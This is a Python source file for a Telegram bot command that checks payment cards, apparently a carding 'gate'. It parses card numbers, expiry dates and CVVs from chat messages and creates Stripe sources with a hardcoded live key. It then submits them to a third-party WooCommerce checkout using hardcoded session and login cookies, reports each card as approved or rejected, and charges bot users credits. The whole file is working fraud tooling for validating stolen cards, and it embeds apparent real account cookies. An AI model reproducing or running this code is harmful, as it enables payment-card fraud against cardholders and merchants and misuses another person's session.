import time
from pyrogram import Client
import requests
import re
import bs4
from values import *
from pyrogram import Client, filters
import json



@Client.on_message(filters.command(["si"], prefixes=[".", "/", "!"], case_sensitive=False) & filters.text)
async def si(Client, message):
    try:
        started_time = time.time()
        banned_bins = open('files/bannedbin.txt', 'r').readlines()
        verified_gps = open('files/groups.txt', 'r').readlines()
        if (str(message.chat.id) + "\n" not in verified_gps and message.chat.type != "private"):
            await message.reply_text(text= group_not_allowed,reply_to_message_id=message.message_id)
        else:
            text = f"""
<b>〄</b> GATE: <b>STRIPE AUTH [5]</b>
<b>○</b> PROCESS: <b>□□□□□□□□□□ 0% </b>
<b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a></b>
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
            msg = await message.reply_text(text=text,reply_to_message_id=message.message_id)
            await Client.send_chat_action(message.chat.id, "typing")
            find = maindb.find_one({"_id": message.from_user.id})
            if isinstance(find, type(None)) == True:
                await msg.edit_text(use_not_registered)
            elif find['status'] == "F":
                await msg.edit_text(free_user)
            elif find['status'] == "P" and find['credits'] < 2:
                await msg.edit_text("""<b>You comsumed all your credits. hit /buy to buy more credits. And now are demoted to a free user</b>""")
                maindb.update_one({'_id': message.from_user.id},{
                    '$set': {
                        "plan": "FREE PLAN",
                        "role": "FREE USER",
                        "status": "F",
                        "credits": 0}}, upsert=False)
            else:
                antispam_time = int(antidb.get(message.from_user.id).decode("utf-8"))
                spam_time = int(time.time()) - antispam_time
                role = find["status"]
                if role == "P" and spam_time < 20:
                    time_left = 20 - spam_time
                    await msg.edit_text(f"""<b> AntiSpam try again after {time_left}'s</b>""")
                else:
                    if message.reply_to_message is not None:
                        message.text = message.reply_to_message.text
                    input = re.findall(r"[0-9]+", message.text)
                    try:
                        if len(input) == 0:
                            raise ValueError
                        cc = input[0]
                        mes = input[1]
                        ano = input[2]
                        ano1 = input[2]
                        cvv = input[3]
                        if len(input) == 3:
                            cc = input[0]
                            mes = input[1][:2]
                            ano = input[1][2:]
                            ano1 = input[1][2:]
                            cvv = input[2]
                        if len(mes) > 2:
                            ano = cvv
                            cvv = mes
                            mes = ano1
                    except IndexError as e:
                            await msg.edit_text("Your Card Is Incorrect.")
                    except ValueError as e:
                            await msg.edit_text("Your Card Is Empty.")
                    except Exception as e:
                            await Client.send_message(chat_id=loggp, text=e)
                    else:
                        if int(cc[0]) in waste_cards:
                            await msg.edit_text("Your Card Is Invalid.")
                        elif int(len(cc))not in [15,16]:
                            await msg.edit_text("Your Card Is To Short.")
                        elif int(len(mes)) not in [2,4] or len(mes) == 2 and mes > '12' or len(mes) == 2 and mes < '01' or len(mes) != 2:
                            await msg.edit_text("Your Card Month Is Incorrect.")
                        elif int(len(ano)) not in [2,4] or len(ano) < 2  or len(ano) == 2 and ano < '21' or len(ano)  == 4 and ano < '2021' or len(ano) == 2 and ano > '29' or len(ano)  == 4 and ano > '2029' or len(ano) > 4 or len(ano) == 3:
                            await msg.edit_text("Your Card Year Is Incorrect.")
                        elif int(cc[0]) == 3 and len(cvv) != 4 or len(cvv) < 3 or len(cvv) > 4:
                            await msg.edit_text("Your Card Cvv Is Incorrect.")
                        else: 
                            lista = cc + "|" + mes + "|" + ano + "|" + cvv
                            bin = cc[:6]
                            res = requests.get("https://adyen-enc-and-bin-info.herokuapp.com/bin/" + bin)
                            if res.status_code != requests.codes.ok or json.loads(res.text)['result'] == False:
                                await msg.edit_text("Your Card Is Invalid.")
                            elif str(bin) + "\n"in banned_bins:
                                await msg.edit_text("Your Card Is Banned.")
                            else:
                                bin_data = json.loads(res.text)
                                # vendor = bin_data["data"]["vendor"].lower()
                                curl =  requests.Session()
                                res = requests.get("https://randomuser.me/api/?nat=us&inc=name,location")
                                random_data = json.loads(res.text)
                                # phone_number = "225"+ "-" + str(random.randint(111,999))+ "-" +str(random.randint(0000,9999))
                                first_name = random_data['results'][0]['name']['first']
                                # last_name = random_data['results'][0]['name']['last']
                                # street = str(random_data['results'][0]['location']['street']['number']) +" " +random_data['results'][0]['location']['street']['name']
                                # city = random_data['results'][0]['location']['city']
                                # state = random_data['results'][0]['location']['state']
                                # zip = random_data['results'][0]['location']['postcode']
                                email = str(''.join(random.choices(string.ascii_lowercase + string.digits, k = 8))) + '@gmail.com'
                                # password = str("".join(random.choices(string.ascii_uppercase + string.digits, k=10)))
                                url = 'https://api.stripe.com/v1/sources' 
                                postdata= { 
                                'type': 'card',
                                'owner[name]': first_name,
                                'owner[email]': email,
                                'card[number]': cc,
                                'card[cvc]': cvv,
                                'card[exp_month]': mes,
                                'card[exp_year]': ano,
                                'pasted_fields': 'number',
                                'payment_user_agent': 'stripe.js/7338eae82;+stripe-js-v3/7338eae82',
                                'time_on_page': '60284',
                                'key': 'pk_live_K5aycu0GSd69PQjhvRAuuTN5', 
                                } 
                                post = requests.post(url = url, headers = sk_headers , data = postdata) 
                                json_first = json.loads(post.text)
                                json_first = json.loads(res.text)
                                if 'error' in json_first:
                                    text = f"""
<b>〄</b> GATE: <b>STRIPE AUTH [5]</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> RESULT: <b>REJECTED❌ [INCORRECT CARD]</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
<b>○</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                    await msg.edit_text(text)
                                    antidb.set(message.from_user.id, int(time.time()))
                                elif 'id' not in json_first:
                                    text = f"""
<b>〄</b> GATE: <b>STRIPE AUTH [5]</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> RESULT: <b>REJECTED❌ [ERROR]</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
<b>○</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                    await msg.edit_text(text)
                                    antidb.set(message.from_user.id, int(time.time()))
                                else:
                                    id = json_first["id"]
                                    text = f"""
<b>〄</b> GATE: <b>STRIPE AUTH [5]</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> PROCESS: <b>■■■■■□□□□□ 50%</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
<b>○</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                    await msg.edit_text(text)
                                    url = 'https://www.benzinga.com/premium/ideas/?wc-ajax=checkout'
                                    headers = {
                                    'Host': 'www.benzinga.com',
                                    'accept': 'application/json, text/javascript, */*; q=0.01',
                                    'x-requested-with': 'XMLHttpRequest',
                                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; RMX3063) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36',
                                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                                    'origin': 'https://www.benzinga.com',
                                    'referer': 'https://www.benzinga.com/premium/ideas/basic-starter-membership-checkout-2/'
                                    }
                                    s = requests.session()
                                    s.cookies.set( 'woocommerce_items_in_cart','1')
                                    s.cookies.set('cartflows_session_149488','149488_1554a2d257fd776d29b310652e386c3f')
                                    s.cookies.set('wordpress_logged_in_6f03deec436dd642aadf9d5eaca59b25','anirbanbanerjee718%7C1635959942%7CTjZLxL5VMiF1DnjsrmpY3qtave4kyxJ2QHC80Da0zyo%7Caf3779970d46acc7f14a8400f4612565f8558ba51319eb8485b794b0859c5133')
                                    s.cookies.set('wp_woocommerce_session_6f03deec436dd642aadf9d5eaca59b25','36691%7C%7C1634923072%7C%7C1634919472%7C%7Cebe2df02d13f2589c3366fe8010a16da')
                                    s.cookies.set('woocommerce_cart_hash','e94d58a25cbe6e6418b7eee59c4c64e7')
                                    s.cookies.set('PHPSESSID','n020dlsjs8tjsldirtsi2ji7di')
                                    s.cookies.set('sbjs_migrations','1418474375998%3D1')
                                    s.cookies.set('sbjs_current_add','fd%3D2021-10-20%2016%3A47%3A55%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.benzinga.com%2Fpremium%2Fideas%2Fbasic-starter-membership-checkout-2%2F%7C%7C%7Crf%3Dandroid-app%3A%2F%2Forg.telegram.messenger%2F')
                                    s.cookies.set('sbjs_first_add','fd%3D2021-10-20%2016%3A47%3A55%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.benzinga.com%2Fpremium%2Fideas%2Fbasic-starter-membership-checkout-2%2F%7C%7C%7Crf%3Dandroid-app%3A%2F%2Forg.telegram.messenger%2F')
                                    s.cookies.set('sbjs_current','typ%3Dreferral%7C%7C%7Csrc%3Dorg.telegram.messenger%7C%7C%7Cmdm%3Dreferral%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%2F%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29')
                                    s.cookies.set('sbjs_first','typ%3Dreferral%7C%7C%7Csrc%3Dorg.telegram.messenger%7C%7C%7Cmdm%3Dreferral%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%2F%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29')
                                    s.cookies.set('sbjs_udata','vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20RMX3063%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F87.0.4280.101%20Mobile%20Safari%2F537.36')
                                    s.cookies.set('_omappvp','DhXm0Qy3WF9A9bU86LzCFMrCb80pxhru5694wxM2aHuGtiKthNj9SVBm7R5ddytW1cxPMup2uHuSwxcRhQVJDS4ZvWvxBsaV')
                                    s.cookies.set('_gcl_au','1.1.569152924.1634750278')
                                    s.cookies.set('_hjid','6c639734-7925-4bca-859f-25648a192593')
                                    s.cookies.set('_hjFirstSeen','1')
                                    s.cookies.set('_fbp','fb.1.1634750279545.890995477')
                                    s.cookies.set('_hjIncludedInPageviewSample','1')
                                    s.cookies.set('_hjAbsoluteSessionInProgress','0')
                                    s.cookies.set('ajs_anonymous_id','e5882aa3-fa8d-4cd2-8290-1433c3642ba9')
                                    s.cookies.set('wooTracker','wxHwNyHCAgP5')
                                    s.cookies.set('_ga','GA1.1.365858588.1634750285')
                                    s.cookies.set('_tpapp','lErPee6jjCE4FaPRNwiOTAUZ6LahY56eSQGY18T7w4jjG2AzC179xP2DKJrXob9TzBmU4RPvuzKYu94ac5qx4gY6AH5BV4aD')
                                    s.cookies.set('__stripe_mid','e9e82056-9812-4005-935e-280b9f70669e8b9ae7')
                                    s.cookies.set('__stripe_sid','6d4df6b5-000f-4867-888f-3c62571bd47a959cb0')
                                    s.cookies.set('tp-shown-widgets','r8vecb')
                                    s.cookies.set('_omappvs','1634750353095')
                                    s.cookies.set('sbjs_session','pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.benzinga.com%2Fpremium%2Fideas%2Fbasic-starter-membership-checkout-2%2F')
                                    s.cookies.set('_uetsid','af92715031c911ec97dea5ebf08cf3cc')
                                    s.cookies.set('_uetvid','af945c0031c911ecb52b8194d50f79ff')
                                    s.cookies.set('_ga_V7ZK73W7N0','GS1.1.1634750283.1.1.1634750361.0')
                                    s.cookies.set('tp-submitted-notifications','awjno3uJ')
                                    s.cookies.set('tp-shown-notifications','YvrJKXT8,WOrVywh8,91zwVGtz,R47kRETv,Al5Oz2I3,Yvr9ejU8,ya9kR4iM,rma3aefb,kmoO5phR')
                                    postdata = {
                                    'billing_email': email,
                                    'metorik_source_type': 'referral',
                                    'metorik_source_url': 'android-app://org.telegram.messenger/',
                                    'metorik_source_mtke': '(none)',
                                    'metorik_source_utm_campaign': '(none)',
                                    'metorik_source_utm_source': 'org.telegram.messenger',
                                    'metorik_source_utm_medium': 'referral',
                                    'metorik_source_utm_content': '/',
                                    'metorik_source_utm_id': '(none)',
                                    'metorik_source_utm_term': '(none)',
                                    'metorik_source_session_entry': 'https://www.benzinga.com/premium/ideas/basic-starter-membership-checkout-2/',
                                    'metorik_source_session_start_time': '2021-10-20+16:47:55',
                                    'metorik_source_session_pages': '2',
                                    'metorik_source_session_count': '1',
                                    '_wcf_flow_id': '149488',
                                    '_wcf_checkout_id': '161706',
                                    'demo': 'on',
                                    'coupon_code': '',
                                    'payment_method': 'stripe',
                                    'woocommerce-process-checkout-nonce': 'f413a1c6de',
                                    '_wp_http_referer': '/premium/ideas/basic-starter-membership-checkout-2/?wc-ajax=update_order_review',
                                    'stripe_source': id,
                                    }
                                    two = s.post(url = url, headers = headers , data = postdata) 
                                    text = f"""
<b>〄</b> GATE: <b>STRIPE AUTH [5]</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> PROCESS: <b>■■■■■■■■■■ 100%</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
<b>○</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
<b>○</b> TIME TAKING: <b>{get_time_taken(started_time)}'s</b>
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                    await msg.edit_text(text)
                                    try:
                                        if 'We were unable to process your order' in two.text and two.status_code == requests.codes.ok:
                                            response = "REJECTED"
                                            r_logo = "❌"
                                        elif 'We were unable to process your order' not in two.text and two.status_code == requests.codes.ok:
                                            response = "APPROVED"
                                            r_logo = "✅"
                                        else:
                                            response = "ERROR"
                                            r_logo = "❗"
                                    except Exception as e:
                                        await Client.send_message(chat_id=loggp, text=e)
                                    else:
                                        if response is None:
                                            await msg.edit_text("PROXY DEAD PLEASE REPORT TO OWNER @r0ld3x")
                                        else:
                                            credits = find['credits']
                                            credits_left = credits - 2
                                            maindb.update_one({'_id': message.from_user.id},{'$set': {'credits': credits_left}}, upsert=False)
                                            lasttext = f"""
<b>〄</b> GATE: <b>STRIPE AUTH [5]</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> RESULT: <b>{response}[{r_logo}]</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
<b>○</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
<b>○</b> CREDIT LEFT: {credits_left}
<b>○</b> TIME TAKEN: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                            await msg.edit_text(lasttext)
                                            antidb.set(message.from_user.id, int(time.time()))
    except ProxyError as e:
        await msg.edit_text("PROXY DEAD PLEASE REPORT TO OWNER <code>@r0ld3x</code>")
        await Client.send_message(chat_id=loggp, text=proxy)
    except Exception as e:
        await Client.send_message(chat_id=loggp, text=e)
        print(e)
